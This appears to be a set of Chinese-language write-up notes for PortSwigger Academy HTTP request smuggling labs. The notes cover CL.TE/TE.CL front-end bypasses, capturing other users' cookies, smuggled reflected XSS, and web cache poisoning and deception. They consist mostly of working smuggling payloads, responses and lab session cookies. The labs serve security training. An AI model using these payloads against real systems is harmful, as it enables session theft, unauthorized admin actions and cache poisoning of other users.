
## 使用 HTTP 请求走私绕过前端安全控制

实验：利用 HTTP 请求走私绕过前端安全控制，CL.TE 漏洞
https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te

修改首页请求
```
Transfer-Encoding: chunked
Content-Length: 32

0

GET /admin HTTP/1.1
Foo: x
```
响应
Admin interface only available to local users

修改为，此处若直接在后半使用
Host: localhost
将得到重复头部的响应
那么应当设置一个完整请求
```
Transfer-Encoding: chunked
Content-Length: 113

0

POST /404 HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 2

x
```
此时在主页中包含管理员面板
访问后设置url为
/admin/delete?username=carlos

思考：CL.TE结构中，若后段设置为分块并且分块大小符号设置大于0，那么应该也能够实现缓存走私，但实际仅返回400
答：若设置分块，虽然可对下一个请求进行连接，然而由于分块的结尾要求0\r\n\r\n结尾，缺乏结尾而导致后半与后续请求都无效。
于是在后段仅可使用 Content-Length，此时后半有效而后续请求无效


实验：利用 HTTP 请求走私绕过前端安全控制，TE.CL 漏洞
https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl

修改首页请求
```
Content-Length: 4
Transfer-Encoding: chunked

66
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Host: localhost

0


```
在主页中包含管理员面板

修改url与分段长度，即可删除目标用户
```
Content-Length: 4
Transfer-Encoding: chunked

82
POST /admin/delete?username=carlos HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Host: localhost

0


```


## 揭露前端请求重写

实验：利用 HTTP 请求走私揭示前端请求重写
https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting

寻找可反射post体的请求，使用其走私后续请求，从而得到前端服务器如何处理头部的信息

此处使用搜索功能
POST / HTTP/2

search=aaaaaaaaaaaaaaaaa

响应为
```html
<h1>0 search results for 'aaaaaaaaaaaaaaaaa'</h1>
```

使用探查头部测试为 CL.TE 结构
修改探查头部为
```
Transfer-Encoding: chunked
Content-Length: 51

0

POST / HTTP/1.1
Content-Length: 40

search=
```
响应为
```html
<h1>0 search results for 'POST / HTTP/1.1
X-KkxFcf-Ip: 223.11.136.7
'</h1>
```

使用得到的前端服务器重写头部信息进行修改
```
Transfer-Encoding: chunked
Content-Length: 77

0

POST /admin HTTP/1.1
Content-Length: 6
X-KkxFcf-Ip: 127.0.0.1

x


```
走私的请求响应包含管理员面板
修改url为删除功能



## 截获其他用户请求

实验：利用 HTTP 请求走私捕获其他用户的请求
https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests

已知为CL.TE结构，使用评论功能，持续调整内容长度知道获取目标cookie信息
```
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 307

0

POST /post/comment HTTP/1.1
Host: 0abb0055040007a9800c71c9005c003e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 910
Cookie: session=4OS9ANqDU9swdiSkJEXG8WyehYOFLvLX

csrf=INHFhvGc0gT9Rrru6SAWtnpfh1anV00P&postId=7&name=test&email=a%40a&website=&comment=
```

```
GET / HTTP/1.1 Host: 0abb0055040007a9800c71c9005c003e.web-security-academy.net sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24" sec-ch-ua-mobile: ?0 sec-ch-ua-platform: "Linux" upgrade-insecure-requests: 1 user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 sec-fetch-site: none sec-fetch-mode: navigate sec-fetch-user: ?1 sec-fetch-dest: document accept-encoding: gzip, deflate, br, zstd accept-language: en-US,en;q=0.9 priority: u=0, i cookie: victim-fingerprint=PN9ZWFnBEYTy3MegOKTK8AF1c8GgAxJf; secret=brKwnXbN7OneHvVrBFADSHSi5uNFN8D0; session=ZG86JAJSvbmsMPQu3j4pJdw542V8ZejC Cont
```
使用得到的cookie

## 使用 HTTP 请求走私来利用反射型 XSS

实验：利用 HTTP 请求走私来传递反射型 XSS
https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss

> 注意到评论表单中包含你的 User-Agent 头部信息在一个隐藏的输入框里。

请求头部为
User-Agent: test
响应为
```html
<input required type="hidden" name="userAgent" value="test">
```

设置XSS载荷为
User-Agent: test"><svg onload="alert(1)
响应为
```html
<input required type="hidden" name="userAgent" value="test">
<svg onload="alert(1)">
```

设置XSS走私为
```
Transfer-Encoding: chunked
Content-Length: 81

0

GET /post?postId=3 HTTP/1.1
User-Agent: test"><svg onload="alert(1)
Foo: x
```


## 使用 HTTP 请求走私进行网页缓存中毒
实验：利用 HTTP 请求走私执行网页缓存中毒
https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning

使用下一页功能得到重定向响应
GET /post/next?postId=8 HTTP/2
Host: 0a2d009e039eb34a80480df70077004e.web-security-academy.net
响应为
HTTP/2 302 Found
Location: https://0a2d009e039eb34a80480df70077004e.web-security-academy.net/post?postId=9
其中拥有host与路径
> 尝试使用不同的 Host 头对生成的请求进行走私

设置控制页面
路径为
/post
头部为
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Access-Control-Allow-Origin: *
响应体为
alert(document.cookie)


在主页，或任何可使用POST方法的位置
POST / HTTP/1.1
修改头部为
```
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 128

0

GET /post/next?postId=8 HTTP/1.1
Host: exploit-0aee005a03f8b34080b40cca018a009b.exploit-server.net
Content-Length: 2

x
```
第二次请求的响应成功重定向
HTTP/1.1 302 Found
Location: https://exploit-0aee005a03f8b34080b40cca018a009b.exploit-server.net/post?postId=9


发送主页的POST请求，走私一个重定向头部
随后立即发送对脚本的请求
GET /resources/js/tracking.js HTTP/2
此时，前端将把走私的重定向头部作为后端对脚本的响应并缓存


## 使用 HTTP 请求走私执行网页缓存欺骗
实验：利用 HTTP 请求走私执行网页缓存欺骗
https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception

在账户资料页面存在敏感信息
/my-account

在主页设置头部为
```
Content-Length: 37
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
Foo: x
```
响应为
```
HTTP/1.1 302 Found
Location: /login
```
请求走私成功

在代理服务器过滤器中设置过滤条件为
Your API Key is
并且开启其他静态资源的显示

发送走私请求后在首页刷新
在其中一个静态资源缓存了目标用户的敏感信息














